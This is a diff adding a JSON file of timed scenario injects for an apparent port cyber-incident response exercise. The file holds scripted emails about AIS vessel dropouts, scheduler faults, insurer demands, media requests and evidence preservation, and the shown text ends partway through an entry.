@@ -1,0 +1,1794 @@
+[
+  {
+    "time_offset": 0,
+    "event_id": "INJ_START",
+    "target": "VM-UI",
+    "action_type": "payload",
+    "payload": {
+      "command": "start_scenario",
+      "parameters": {}
+    },
+    "manual": true
+  },
+  {
+    "_comment": "========== SCENARIO START =========="
+  },
+  {
+    "_comment": "========== PHASE 1-1 (T+2 to T+5) =========="
+  },
+  {
+    "time_offset": 2,
+    "event_id": "P1-1-EMAIL1",
+    "target": "VM-UI",
+    "action_type": "payload",
+    "payload": {
+      "command": "send_email",
+      "parameters": {
+        "from_name": "Emily Nguyen (Executive Assistant)",
+        "subject": "Daily Coordination Rhythm – Confirming Today's Approach",
+        "to": ["executive@simrange.local"],
+        "body": "Good morning Executive Team,\n\nGiven ongoing operational activities and routine checks, please confirm if you would like to initiate scheduled coordination meetings today. If yes, please outline preferred frequency and participants to include. Awaiting your response.\n\nKind regards,\nEmily Nguyen"
+      }
+    },
+    "manual": false
+  },
+  {
+    "time_offset": 2,
+    "event_id": "P1-1-EMAIL2",
+    "target": "VM-UI",
+    "action_type": "payload",
+    "payload": {
+      "command": "send_email",
+      "parameters": {
+        "from_name": "Tom Rivers (Policy Officer)",
+        "subject": "Contingency Document Review Outstanding?",
+        "to": ["legal@simrange.local"],
+        "body": "Hi Legal Team,\n\nI noticed that our digital infrastructure contingency policy expired in Q1 and hasn't yet been updated. Could you please review this urgently? If this is a significant oversight, please ensure the Executive Team is informed promptly.\n\nBest regards,\nTom Rivers"
+      }
+    },
+    "manual": false
+  },
+  {
+    "time_offset": 2,
+    "event_id": "P1-1-EMAIL3",
+    "target": "VM-UI",
+    "action_type": "payload",
+    "payload": {
+      "command": "send_email",
+      "parameters": {
+        "from_name": "Angela Poole (Head of External Affairs)",
+        "subject": "Staff Buzzing Over MarineTracker",
+        "to": ["media@simrange.local"],
+        "body": "Hi Team,\n\nInternal staff appear unusually active today, repeatedly checking MarineTracker. Can we please ensure our basic holding statement template is ready? Please verify with Legal and confirm once aligned and prepared. Thanks!\n\nCheers,\nAngela Poole"
+      }
+    },
+    "manual": false
+  },
+  {
+    "time_offset": 2,
+    "event_id": "P1-1-EMAIL4",
+    "target": "VM-UI",
+    "action_type": "payload",
+    "payload": {
+      "command": "send_email",
+      "parameters": {
+        "from_name": "Harjit Mann (Network Monitoring)",
+        "subject": "Node-04: Outbound Packet Queue Spike",
+        "to": ["tech@simrange.local"],
+        "body": "Technical Team,\n\nWe've detected sustained outbound packet queuing on Node-04. Could someone please check the relevant logs urgently and confirm if action is needed to contain or address this? Let us know your findings and recommendations.\n\nThanks,\nHarjit Mann"
+      }
+    },
+    "manual": false
+  },
+  {
+    "time_offset": 2,
+    "event_id": "P1-1-EMAIL5",
+    "target": "VM-UI",
+    "action_type": "payload",
+    "payload": {
+      "command": "send_email",
+      "parameters": {
+        "from_name": "Grace Hitchens (Routing Coordinator)",
+        "subject": "Packet Delay to Ship Manifest System",
+        "to": ["ops@simrange.local"],
+        "body": "Ops Team,\n\nWe're experiencing minor delays in packet routing affecting the ship manifest system. Please confirm if you've noticed any downstream operational impact at terminals. Could you also verify with Technical if this issue is backend-only?\n\nRegards,\nGrace Hitchens"
+      }
+    },
+    "manual": false
+  },
+  {
+    "_comment": "========== PHASE 1-2 (T+6 to T+9) =========="
+  },
+  {
+    "time_offset": 6,
+    "event_id": "P1-2-EMAIL6",
+    "target": "VM-UI",
+    "action_type": "payload",
+    "payload": {
+      "command": "send_email",
+      "parameters": {
+        "from_name": "Legal Team",
+        "subject": "AIS Anomaly and Contingency Policy Status",
+        "to": ["executive@simrange.local"],
+        "body": "Executive Team,\n\nWe're experiencing anomalies, notably Ship_Alpha disappearing from the AIS dashboard. Additionally, contingency policy documentation remains expired. Recommend a brief status check across Technical and Operations to evaluate if immediate escalation to crisis response is warranted.\n\nAwaiting your decision,\nLegal Team"
+      }
+    },
+    "manual": false
+  },
+  {
+    "time_offset": 7,
+    "event_id": "P1-2-EMAIL7",
+    "target": "VM-UI",
+    "action_type": "payload",
+    "payload": {
+      "command": "send_email",
+      "parameters": {
+        "from_name": "Nick Menon (Group Risk & Insurance)",
+        "subject": "Clause 7.4 – External Communications Exposure Reminder",
+        "to": ["legal@simrange.local"],
+        "body": "Legal Team,\n\nPlease urgently review clause 7.4 regarding external communications. Given the developing AIS issue, confirm immediately whether formal external communication blackout must be enforced to maintain insurance compliance. Respond promptly with your decision.\n\nThanks,\nNick Menon"
+      }
+    },
+    "manual": false
+  },
+  {
+    "time_offset": 8,
+    "event_id": "P1-2-EMAIL8",
+    "target": "VM-UI",
+    "action_type": "payload",
+    "payload": {
+      "command": "send_email",
+      "parameters": {
+        "from_name": "Angela Poole (Head of External Affairs)",
+        "subject": "PR Photo Request – Ship_Alpha",
+        "to": ["media@simrange.local"],
+        "body": "Media Team,\n\nWe received a request for archived PR photos of Ship_Alpha. Given current operational anomalies, please review our internal holding statements, confirm if comms blackout is necessary, and obtain Legal's clearance urgently before responding.\n\nKind regards,\nAngela Poole"
+      }
+    },
+    "manual": false
+  },
+  {
+    "time_offset": 9,
+    "event_id": "P1-2-EMAIL9",
+    "target": "VM-UI",
+    "action_type": "payload",
+    "payload": {
+      "command": "send_email",
+      "parameters": {
+        "from_name": "Operations Team",
+        "subject": "Ship_Alpha Not Showing in AIS – Check Logs",
+        "to": ["tech@simrange.local"],
+        "body": "Technical Team,\n\nWe have lost visibility of Ship_Alpha on our AIS dashboard. Please urgently access relevant logs, verify timestamps, and determine whether this issue is isolated or indicates broader systemic concerns. Immediate feedback required.\n\nBest,\nOperations Team"
+      }
+    },
+    "manual": false
+  },
+  {
+    "_comment": "========== PHASE 1-3 (T+11 to T+15) =========="
+  },
+  {
+    "time_offset": 11,
+    "event_id": "P1-3-EMAIL10",
+    "target": "VM-UI",
+    "action_type": "payload",
+    "payload": {
+      "command": "send_email",
+      "parameters": {
+        "from_name": "Operations Team",
+        "subject": "Two Vessels off AIS – Escalation and Continuity Concern",
+        "to": ["executive@simrange.local"],
+        "body": "Executive Team,\n\nA second vessel has now dropped intermittently from AIS. We urgently need to determine if formal incident response mode should be activated. Recommend immediate internal huddle to address continuity planning and escalation strategy.\n\nAwaiting instructions,\nOperations Team"
+      }
+    },
+    "manual": false
+  },
+  {
+    "time_offset": 12,
+    "event_id": "P1-3-EMAIL11",
+    "target": "VM-UI",
+    "action_type": "payload",
+    "payload": {
+      "command": "send_email",
+      "parameters": {
+        "from_name": "Media Team",
+        "subject": "Journalist Enquiry on Visibility Issue",
+        "to": ["legal@simrange.local"],
+        "body": "Legal Team,\n\nWe've received an enquiry from a journalist regarding the vessel visibility issue. Please urgently confirm if formal internal communication blackout advisory must now be enforced or if we're cleared to respond using our internal holding statement.\n\nThanks,\nMedia Team"
+      }
+    },
+    "manual": false
+  },
+  {
+    "time_offset": 13,
+    "event_id": "P1-3-EMAIL12",
+    "target": "VM-UI",
+    "action_type": "payload",
+    "payload": {
+      "command": "send_email",
+      "parameters": {
+        "from_name": "Journalist (External)",
+        "subject": "Visibility Issue with Southgate Ship Tracking",
+        "to": ["media@simrange.local"],
+        "body": "Hi,\n\nWe've heard reports of AIS visibility issues impacting ship tracking at Southgate Terminal. Could you please provide clarity or an official statement on this matter urgently? Awaiting your response.\n\nRegards,\nAlex Morton"
+      }
+    },
+    "manual": false
+  },
+  {
+    "time_offset": 14,
+    "event_id": "P1-3-EMAIL13",
+    "target": "VM-UI",
+    "action_type": "payload",
+    "payload": {
+      "command": "send_email",
+      "parameters": {
+        "from_name": "Incident Coordinator",
+        "subject": "Summary of AIS Diagnostics Due",
+        "to": ["tech@simrange.local"],
+        "body": "Technical Team,\n\nPlease urgently provide a concise summary of your AIS diagnostics, including anomalies identified, timelines, and recommended next diagnostic steps. Ensure clarity and completeness as this will inform our Situation Update Document.\n\nThanks,\nIncident Coordinator"
+      }
+    },
+    "manual": false
+  },
+  {
+    "time_offset": 15,
+    "event_id": "P1-3-EMAIL14",
+    "target": "VM-UI",
+    "action_type": "payload",
+    "payload": {
+      "command": "send_email",
+      "parameters": {
+        "from_name": "Harbour Control",
+        "subject": "Second Vessel Dropping from AIS – Manual Tracking Preparations",
+        "to": ["ops@simrange.local"],
+        "body": "Operations Team,\n\nShip_Bravo is also intermittently disappearing from AIS. Recommend urgent cross-checking of CCTV visuals against dashboard data. Please confirm if immediate preparation for manual tracking and operational fallback protocols are warranted.\n\nBest regards,\nHarbour Control"
+      }
+    },
+    "manual": false
+  },
+  {
+    "_comment": "========== PHASE 2-1 (T+20 to T+30) =========="
+  },
+  {
+    "time_offset": 20,
+    "event_id": "P2-1-EMAIL1",
+    "target": "VM-UI",
+    "action_type": "payload",
+    "payload": {
+      "command": "send_email",
+      "parameters": {
+        "from_name": "Angela Poole (External Affairs)",
+        "subject": "Urgent: Vendor Email Leak – Immediate Response Required",
+        "to": ["media@simrange.local", "executive@simrange.local"],
+        "body": "Media and Executive Teams,\n\nWe've been made aware that a chain of vendor emails has been leaked externally and is circulating among industry stakeholders. These emails reference integration issues and imply fault on our side. This could escalate quickly if not addressed.\n\nTo manage this, I propose we prepare a short public statement acknowledging the leak, committing to transparency, and confirming we are conducting an internal investigation. Before doing so, I suggest immediate consultation with Legal.\n\nPlease reply with your position on this approach. If authorised, we will begin drafting and route through Legal for clearance.\n\nKind regards,\nAngela"
+      }
+    },
+    "manual": false
+  },
+  {
+    "time_offset": 22,
+    "event_id": "P2-1-EMAIL2",
+    "target": "VM-UI",
+    "action_type": "payload",
+    "payload": {
+      "command": "send_email",
+      "parameters": {
+        "from_name": "Dave Renwick (Finance)",
+        "subject": "Vendor Payments – Potential Compromise",
+        "to": ["legal@simrange.local", "executive@simrange.local"],
+        "body": "Hi all,\n\nWith the vendor email incident unfolding, I need immediate advice on whether we should proceed with the batch payments scheduled for tomorrow. Two of the vendors affected are due substantial amounts.\n\nCould Legal confirm whether it's appropriate to delay payment until we understand the full extent of the leak? If so, Executive will need to endorse that decision and direct how it should be communicated.\n\nI await your recommendation urgently.\n\nRegards,\nDave"
+      }
+    },
+    "manual": false
+  },
+  {
+    "time_offset": 24,
+    "event_id": "P2-1-EMAIL3",
+    "target": "VM-UI",
+    "action_type": "payload",
+    "payload": {
+      "command": "send_email",
+      "parameters": {
+        "from_name": "Technical Monitoring System",
+        "subject": "Scheduler Anomaly Detected – Immediate Investigation Required",
+        "to": ["tech@simrange.local"],
+        "body": "Technical Team,\n\nOur alerting platform has detected multiple queueing delays within the container scheduler. Current estimates suggest processing lags of up to 20 minutes in some nodes.\n\nThis may be symptomatic of backend service contention or a misconfiguration—but given ongoing issues, manipulation cannot be ruled out. Please investigate thoroughly, log findings clearly, and inform Incident Coordinator if isolation becomes necessary.\n\nRegards,\nSystem Monitor"
+      }
+    },
+    "manual": false
+  },
+  {
+    "time_offset": 26,
+    "event_id": "P2-1-EMAIL4",
+    "target": "VM-UI",
+    "action_type": "payload",
+    "payload": {
+      "command": "send_email",
+      "parameters": {
+        "from_name": "Operations Dashboard",
+        "subject": "Scheduler Irregularities Detected",
+        "to": ["ops@simrange.local"],
+        "body": "Operations,\n\nDispatch rates from the scheduler have fallen below threshold on Berths C and D. The dashboard confirms this is not a temporary blip—routing handoffs are delayed and some queues are stalled.\n\nYou'll need to assess immediately whether to switch to manual scheduling. Please coordinate with Technical to validate the underlying cause and inform Executive if fallback protocols are activated.\n\nAutomated Alert"
+      }
+    },
+    "manual": false
+  },
+  {
+    "_comment": "========== PHASE 2-2 (T+30 to T+38) =========="
+  },
+  {
+    "time_offset": 30,
+    "event_id": "P2-2-EMAIL5",
+    "target": "VM-UI",
+    "action_type": "payload",
+    "payload": {
+      "command": "send_email",
+      "parameters": {
+        "from_name": "Frank Cossar (Dockmaster)",
+        "subject": "Loss of Visibility on 3 Berths – Urgent Operational Assessment Needed",
+        "to": ["ops@simrange.local"],
+        "body": "Team,\n\nWe've lost live video and sensor uplink to Berths 4, 5, and 7. Dockside traffic is ongoing and visibility is now critical. We must determine within the next 15 minutes whether we're suspending operations on those berths or deploying manual marshalling.\n\nAlso, please verify if this correlates with the broader tech anomalies. Document your decision, rationale, and any immediate measures taken so we can provide an informed response to Executive and Legal.\n\nAdvise me of your plan as soon as possible.\n\nCheers,\nFrank"
+      }
+    },
+    "manual": false
+  },
+  {
+    "time_offset": 32,
+    "event_id": "P2-2-EMAIL6",
+    "target": "VM-UI",
+    "action_type": "payload",
+    "payload": {
+      "command": "send_email",
+      "parameters": {
+        "from_name": "Claire Mitchell (Insurer Contact)",
+        "subject": "Clarity Required on Clause 4.7",
+        "to": ["legal@simrange.local"],
+        "body": "Dear Legal Team,\n\nWith mounting external visibility and references to your terminal in recent industry posts, we're formally seeking clarity under clause 4.7.\n\nPlease advise when the incident was first internally identified and what your internal protocols have been to mitigate impact. We're particularly focused on any communications restrictions you have imposed and whether any external disclosures are being contemplated.\n\nThis information is vital to maintain underwriting cover.\n\nRegards,\nClaire"
+      }
+    },
+    "manual": false
+  },
+  {
+    "time_offset": 34,
+    "event_id": "P2-2-EMAIL7",
+    "target": "VM-UI",
+    "action_type": "payload",
+    "payload": {
+      "command": "send_email",
+      "parameters": {
+        "from_name": "Journalist (External)",
+        "subject": "Immediate CEO Interview Request",
+        "to": ["media@simrange.local", "executive@simrange.local"],
+        "body": "Dear Southgate,\n\nWe're covering the terminal anomalies at Southgate and would like to invite your CEO to appear in a live segment at 4:00pm today.\n\nThe focus will be:\n• Nature of the incident\n• Operational impact\n• Southgate's planned response\n\nPlease advise if the CEO is available, and if not, who can represent the organisation. We aim to maintain balance in our reporting and would prefer to have your voice featured alongside other stakeholders. A prepared written statement is also acceptable if a live appearance isn't feasible.\n\nSincerely,\nJamie Fisher, ABC News"
+      }
+    },
+    "manual": false
+  },
+  {
+    "time_offset": 35,
+    "event_id": "MEDIA-T35-TWEET",
+    "target": "VM-UI",
+    "action_type": "payload",
+    "payload": {
+      "command": "update_dashboard",
+      "parameters": {
+        "dashboard": "media",
+        "change": "publish_tweet",
+        "content": "Why are ships disappearing from tracking systems at #Southgate?! Multiple vessels just vanished from radar. What's going on?? @MarineTracker",
+        "source": "@localwatch",
+        "media_id": "1"
+      }
+    },
+    "manual": false
+  },
+  {
+    "time_offset": 36,
+    "event_id": "P2-2-EMAIL8",
+    "target": "VM-UI",
+    "action_type": "payload",
+    "payload": {
+      "command": "send_email",
+      "parameters": {
+        "from_name": "Technical Dashboard",
+        "subject": "Further Technical Anomalies Detected – Urgent Validation Needed",
+        "to": ["tech@simrange.local"],
+        "body": "Team,\n\nChecksum errors and packet duplication have been observed on container routing nodes. Timeline correlation with earlier scheduler incidents suggests a linked vector.\n\nPlease perform full validation and log your findings. Trace any potential origin points and ensure that logs are archived for forensic follow-up. Notify the Incident Coordinator immediately if this supports escalation. Coordination with Audit and Legal will likely be required in the next phase.\n\nSystem Alert"
+      }
+    },
+    "manual": false
+  },
+  {
+    "_comment": "========== PHASE 2-3 (T+38 to T+45) =========="
+  },
+  {
+    "time_offset": 38,
+    "event_id": "P2-3-EMAIL9",
+    "target": "VM-UI",
+    "action_type": "payload",
+    "payload": {
+      "command": "send_email",
+      "parameters": {
+        "from_name": "Angela Poole (External Affairs)",
+        "subject": "Direct Media Request for CEO Statement",
+        "to": ["media@simrange.local", "executive@simrange.local"],
+        "body": "Colleagues,\n\nWe now have direct contact from two major outlets expecting a formal statement from our CEO. They are offering a tight window for response and intend to run their next story in the 6:00pm slot.\n\nThis is a strategic opportunity—but it carries reputational risk if mishandled. I need urgent agreement on the preferred format (written, live, or recorded), tone (reassuring vs assertive), and whether Legal or Risk should review prior to distribution.\n\nPlease respond immediately so I can coordinate with our press contacts.\n\nAngela"
+      }
+    },
+    "manual": false
+  },
+  {
+    "time_offset": 41,
+    "event_id": "P2-3-EMAIL10",
+    "target": "VM-UI",
+    "action_type": "payload",
+    "payload": {
+      "command": "send_email",
+      "parameters": {
+        "from_name": "Claire Mitchell (Insurer Representative)",
+        "subject": "Urgent: Detailed Breach Documentation Required",
+        "to": ["legal@simrange.local"],
+        "body": "Legal,\n\nPlease provide a detailed record of the current incident, including:\n\n* Start and end points of visibility loss\n* All system anomalies recorded\n* Your formal internal declaration date\n* Summary of technical countermeasures deployed\n* Whether breach notification laws are triggered in your jurisdiction\n\nWe're preparing an insurer-level response to our regulator and must ensure all facts are independently verifiable.\n\nClaire Mitchell\nSenior Claims Liaison"
+      }
+    },
+    "manual": false
+  },
+  {
+    "time_offset": 45,
+    "event_id": "P2-3-EMAIL11",
+    "target": "VM-UI",
+    "action_type": "payload",
+    "payload": {
+      "command": "send_email",
+      "parameters": {
+        "from_name": "Dock Supervisor",
+        "subject": "Operational Status Update – Manual Ops Effectiveness",
+        "to": ["ops@simrange.local"],
+        "body": "Ops Team,\n\nFollowing our shift to manual procedures, I need a detailed operational update within the hour. Include the current throughput statistics, any technical blockers you've encountered, and whether alternate logistics options have been initiated.\n\nAlso confirm if staff rosters are being rotated effectively, and if there are any resource limitations that might affect sustained operations over the next 6–12 hours.\n\nThis report will be tabled at the executive incident debrief.\n\nRegards,\nMichael Carter"
+      }
+    },
+    "manual": false
+  },
+  {
+    "_comment": "========== PHASE 3-1 (T+50 to T+56) =========="
+  },
+  {
+    "time_offset": 50,
+    "event_id": "P3-1-EMAIL1",
+    "target": "VM-UI",
+    "action_type": "payload",
+    "payload": {
+      "command": "send_email",
+      "parameters": {
+        "from_name": "Dylan Forbes – Transport Scheduler",
+        "subject": "URGENT: Two Containers Misrouted — Immediate Guidance Required",
+        "to": ["ops@simrange.local", "executive@simrange.local"],
+        "body": "Team,\n\nLess than ten minutes ago our scheduler routed *CON-44891* and *CON-44902* to Berth 7 instead of Berth 3. The client's freight forwarder is already on the phone demanding an explanation and a corrective plan. I have confirmed the routing error in the container-sched.log (entries 09:04:32 & 09:04:51) and temporarily paused further dispatches for the affected flow group.\n\nI need an Operations decision on whether we (a) redirect those boxes manually, or (b) hold them in situ until we understand the root cause. If you elect to redirect, please confirm manpower and crane availability.\n\nExecutive, please advise if we should prepare a written apology or wait until we can attribute the failure more precisely.\n\nI will stay on channel for real-time updates; expecting an action plan within 15 minutes.\n\nRegards,\nDylan"
+      }
+    },
+    "manual": false
+  },
+  {
+    "time_offset": 52,
+    "event_id": "P3-1-EMAIL2",
+    "target": "VM-UI",
+    "action_type": "payload",
+    "payload": {
+      "command": "send_email",
+      "parameters": {
+        "from_name": "Priya Nair – Legal Intern",
+        "subject": "Notification Threshold – Port Authority & Misrouted Cargo",
+        "to": ["legal@simrange.local", "executive@simrange.local"],
+        "body": "Good morning,\n\nSection 8.3 of the Maritime Safety Regulation obliges us to notify the Port Authority \"without undue delay\" if navigational or routing errors may endanger safety or generate congestion. With two containers already misplaced and rumours of wider system instability, do we cross that threshold?\n\nBefore I draft anything formal I need senior counsel's direction. Specifically:\n\n1. **Is a mandatory notice triggered right now?**\n2. **If yes, who signs and what factual detail can we safely share?**\n3. **Do we concurrently brief our insurer, given clause 12.4 ties coverage to timely regulatory disclosure?**\n\nCopying Executive so they are across the potential requirement. Please instruct at your earliest convenience — ideally within the hour.\n\nThank you,\nPriya"
+      }
+    },
+    "manual": false
+  },
+  {
+    "time_offset": 54,
+    "event_id": "P3-1-EMAIL3",
+    "target": "VM-UI",
+    "action_type": "payload",
+    "payload": {
+      "command": "send_email",
+      "parameters": {
+        "from_name": "Media Team Shared Inbox",
+        "subject": "Local Radio Requesting Comment on Port Delays — Proposed Approach",
+        "to": ["executive@simrange.local", "media@simrange.local"],
+        "body": "Hi all,\n\n\"PortTalk FM\" has asked for a short on-air comment regarding this morning's container delays. They predict the story will run at the top of the half-hour bulletin.\n\nOur draft stance is to *acknowledge limited scheduling issues* while emphasising that safety and throughput remain our top priorities. We intend to quote a Senior Operations spokesperson rather than the CEO at this stage, pending Legal review.\n\nPlease respond in the next 20 minutes on:\n\n* Whether we go live or supply a written statement;\n* Preferred spokesperson name / title;\n* Any data or talking points that are *off-limits* right now.\n\nOnce agreed I'll finalise the key lines and route via Legal for clearance.\n\nRegards,\nJess – Duty Comms Officer"
+      }
+    },
+    "manual": false
+  },
+  {
+    "_comment": "========== PHASE 3-2 (T+58 to T+62) =========="
+  },
+  {
+    "time_offset": 58,
+    "event_id": "P3-2-EMAIL4",
+    "target": "VM-UI",
+    "action_type": "payload",
+    "payload": {
+      "command": "send_email",
+      "parameters": {
+        "from_name": "HR Alerts System (Auto-forwarded by Comms)",
+        "subject": "INTERNAL – Leaked HR Memo Circulating Online",
+        "to": ["executive@simrange.local", "media@simrange.local"],
+        "body": "Colleagues,\n\nAn internal wellbeing memo dated last Friday has been screen-captured and posted to an industry Slack channel. The excerpt claims \"staff are confused about leadership direction and feel safety is being compromised.\"\n\nReputational impact is climbing — the post has been reshared 78 times in the last thirty minutes. I recommend we:\n\n* Acknowledge staff concerns publicly to demonstrate transparency;\n* Funnel any media or social enquiries through the Crisis Comms mailbox;\n* Provide managers talking points for the upcoming shift change in forty minutes.\n\nPlease confirm whether we adopt this approach or propose alternatives. Timing is critical because the union account is now amplifying the leak.\n\n— Comms Monitor"
+      }
+    },
+    "manual": false
+  },
+  {
+    "time_offset": 60,
+    "event_id": "P3-2-EMAIL5",
+    "target": "VM-UI",
+    "action_type": "payload",
+    "payload": {
+      "command": "send_email",
+      "parameters": {
+        "from_name": "Laura Chen – External Legal Counsel",
+        "subject": "Preservation of System Logs – Clause 12.4 Compliance",
+        "to": ["legal@simrange.local", "incident@simrange.local"],
+        "body": "Counsel Team,\n\nOur retainer obliges us to verify that *all* potentially relevant electronic records are preserved once a cyber incident is suspected. Could you provide:\n\n* Confirmation that forensic images of the coretech, gateway and opsnode logs have already been taken;\n* The SHA-256 hash manifest for each image;\n* A copy of your Evidence Preservation SOP showing chain-of-custody.\n\nRegulator enquiries often land within 24 hours of media exposure, so I would appreciate the above no later than **14:00 AEST**. Copying the Incident Coordinator to facilitate log transfer.\n\nRegards,\nLaura"
+      }
+    },
+    "manual": false
+  },
+  {
+    "_comment": "========== PHASE 3-3 (T+64 to T+68) =========="
+  },
+  {
+    "time_offset": 64,
+    "event_id": "P3-3-EMAIL6",
+    "target": "VM-UI",
+    "action_type": "payload",
+    "payload": {
+      "command": "send_email",
+      "parameters": {
+        "from_name": "Claire Mitchell – Senior Claims Liaison, Maritime Insurance Group",
+        "subject": "Formal Demand for Risk Clarification & Artefact Delivery",
+        "to": ["legal@simrange.local", "incident@simrange.local"],
+        "body": "Dear Team,\n\nIn line with policy section 4.2 we hereby request a consolidated risk statement covering:\n\n• Exact timeline of system anomalies (first detection to present).\n• Current operational impact (quantified where possible).\n• Preliminary root-cause hypothesis, including any evidence of malicious interference.\n• Mitigation measures already enacted.\n\nPlease *attach supporting logs* or advise when they will be available for secure download. Failure to supply a good-faith update within **2 hours** may jeopardise interim cover.\n\nKind regards,\nClaire"
+      }
+    },
+    "manual": false
+  },
+  {
+    "time_offset": 65,
+    "event_id": "P3-3-EMAIL7",
+    "target": "VM-UI",
+    "action_type": "payload",
+    "payload": {
+      "command": "send_email",
+      "parameters": {
+        "from_name": "Jamie Fisher – Senior Reporter, ABC News",
+        "subject": "Follow-up Interview Request re: Southgate Incident",
+        "to": ["ceo@simrange.local", "executive@simrange.local", "media@simrange.local"],
+        "body": "Good afternoon,\n\nFurther to my earlier note, our editorial desk would still like to feature Southgate Terminal on the 6 pm bulletin. Viewers will expect clarity on:\n\n1. What triggered today's disruptions;\n2. Potential impact on supply chains ahead of the long weekend;\n3. Measures you're taking to protect crews and cargo.\n\nIf the CEO is unavailable, we would accept your Chief Operating Officer live in-studio at 4 pm, or a pre-recorded package by 5 pm.\n\nPlease confirm participation by **15:00** so we can allocate airtime.\n\nSincerely,\nJamie Fisher\nABC News, National Desk"
+      }
+    },
+    "manual": false
+  },
+  {
+    "time_offset": 67,
+    "event_id": "P3-3-EMAIL8",
+    "target": "VM-UI",
+    "action_type": "payload",
+    "payload": {
+      "command": "send_email",
+      "parameters": {
+        "from_name": "Michael Carter – Dock Supervisor",
+        "subject": "Night-Shift Safety Concerns – Authority to Halt Required",
+        "to": ["ops@simrange.local", "executive@simrange.local"],
+        "body": "Evening Team,\n\nCrew on the late shift report heightened fatigue after spending much of the day in manual mode. Combined with the still-unresolved scheduler anomalies, I'm not convinced we can keep the cranes running safely past 19:00.\n\nPlease provide explicit authorisation to either:\n\n* Suspend night operations entirely; or\n* Continue at <40% capacity with mandatory dual-spotter coverage.\n\nDecision needed by **18:30** to allow roster notifications.\n\nRegards,\nMichael"
+      }
+    },
+    "manual": false
+  },
+  {
+    "time_offset": 68,
+    "event_id": "P3-3-EMAIL9",
+    "target": "VM-UI",
+    "action_type": "payload",
+    "payload": {
+      "command": "send_email",
+      "parameters": {
+        "from_name": "Olivia Grant – PA to CEO",
+        "subject": "Media Crew Assembled at Gate B – Immediate Direction Required",
+        "to": ["executive@simrange.local", "media@simrange.local"],
+        "body": "Hi all,\n\nA three-person ABC camera crew is now outside Gate B requesting footage of container movements and a comment from the CEO. Security is holding them at reception for the next ten minutes.\n\nOptions on the table:\n\n1. Escort them to Briefing Room 2 for a scripted stand-up;\n2. Offer a written statement and deny on-site filming;\n3. Decline entry and suggest a remote interview tomorrow.\n\nPlease advise which path we're taking so I can brief Security and the crew accordingly.\n\nThanks,\nOlivia"
+      }
+    },
+    "manual": false
+  },
+  {
+    "_comment": "========== PHASE 4-1 (T+80 to T+85) =========="
+  },
+  {
+    "time_offset": 80,
+    "event_id": "P4-1-EMAIL1",
+    "target": "VM-UI",
+    "action_type": "payload",
+    "payload": {
+      "command": "send_email",
+      "parameters": {
+        "from_name": "Audit VM System (no-reply@audit.local)",
+        "subject": "Secure access window now open – forensic logs ready for pull-down",
+        "to": ["tech@simrange.local", "legal@simrange.local", "incident@simrange.local"],
+        "body": "This is an automated advisory from the Audit VM.\n\n*Access to */incident/archive* has been unlocked for your credentials for the next **45 minutes**.* All existing hash records have been preserved in read-only mode.\n\n**Required actions:**\n• TECH: copy the *_coretech* and *_gateway* log bundles you flagged in your 09:55 report. Verify SHA-256 locally **before** transfer.\n• LEGAL: review the chain-of-custody template (*/incident/forms/coc_v2.pdf*) and confirm it still aligns with current insurer language.\n• COORDINATOR: timestamp each file arrival in the master timeline and cross-reference with team actions.\n\nWindow auto-closes at **T+100**. Failure to complete transfer will require manual re-authorisation.\n\n— Audit VM Scheduler"
+      }
+    },
+    "manual": false
+  },
+  {
+    "time_offset": 81,
+    "event_id": "P4-1-EMAIL2",
+    "target": "VM-UI",
+    "action_type": "payload",
+    "payload": {
+      "command": "send_email",
+      "parameters": {
+        "from_name": "Priya Patel (Chief Financial Officer)",
+        "subject": "Before we brief – do we still have insurer cover?",
+        "to": ["executive@simrange.local", "legal@simrange.local"],
+        "body": "Colleagues,\n\nBefore we sign off on the external briefing this afternoon I need categorical confirmation that our policy remains intact. Clause 12.2(a) states that cover is subject to *timely notification and evidence preservation*. Claire at NorthStar has already asked twice for our mitigation detail (see her 10:02 and 10:18 messages).\n\n*Questions I need answered by **11:00***:\n\n1. Has formal notice under clause 4.7 been issued **in writing**?\n2. Have we supplied an evidence summary that satisfies paragraph B(i) – \"actions taken to preserve forensic data\"?\n3. Is there any reason the insurer could allege late notification?\n\nIf Legal cannot give an unqualified \"yes\" to all three, we must build that caveat into the Executive brief – otherwise we risk signing off on statements that the underwriter later disputes.\n\nPlease respond on this thread – I will not release the funds for public comms until we are watertight.\n\nThanks,\nPriya"
+      }
+    },
+    "manual": false
+  },
+  {
+    "time_offset": 82,
+    "event_id": "P4-1-EMAIL3",
+    "target": "VM-UI",
+    "action_type": "payload",
+    "payload": {
+      "command": "send_email",
+      "parameters": {
+        "from_name": "Comms Ops Desk (photos@corpcomms.local)",
+        "subject": "URGENT: Need onsite photo of CEO for closing press packet",
+        "to": ["media@simrange.local", "executive@simrange.local"],
+        "body": "Hi team,\n\nAll outlets are requesting a current image of the CEO *at the terminal* to accompany tonight's coverage. A stock head-and-shoulders will look defensive – we need something that conveys presence on-site.\n\n- Preferred shot: CEO in hi-vis, cranes in background.\n- Timing: before **T+105** so we can embed in the release.\n- Shooter: Internal Media Unit can dispatch a photographer within 10 minutes – please confirm access permissions.\n\n@Executive PA – can the CEO spare five minutes on the operations deck? If not, we'll stage the shot at the briefing room entrance but it will appear less authentic.\n\nLet me know *immediately* so we can allocate the lens crew.\n\nRegards,\nDanielle (Image Lead)"
+      }
+    },
+    "manual": false
+  },
+  {
+    "time_offset": 83,
+    "event_id": "P4-1-EMAIL18",
+    "target": "VM-UI",
+    "action_type": "payload",
+    "payload": {
+      "command": "send_email",
+      "parameters": {
+        "from_name": "Nick Menon (Group Risk & Insurance)",
+        "subject": "Media Comment Timing – Insurance Clause 12.2 Risk",
+        "to": ["legal@simrange.local", "executive@simrange.local"],
+        "body": "Legal / Executive,\n\nPress interest is ramping up following this morning's MarineTracker spike. Under clause 12.2 of our cyber-liability policy we must avoid speculative public statements that could prejudice cover.\n\nCould you confirm by 10:30 whether (a) contingency documentation for maritime outages is still valid, and (b) we can truthfully state no personal data systems are affected?\n\nI need this in order to brief our broker before lunchtime media cycles pick it up.\n\nThanks,\nNick"
+      }
+    },
+    "manual": false
+  },
+  {
+    "time_offset": 84,
+    "event_id": "P4-1-EMAIL19",
+    "target": "VM-UI",
+    "action_type": "payload",
+    "payload": {
+      "command": "send_email",
+      "parameters": {
+        "from_name": "Priya Rao (Policy & Compliance)",
+        "subject": "Expired Contingency Plan – Immediate Review Required",
+        "to": ["legal@simrange.local"],
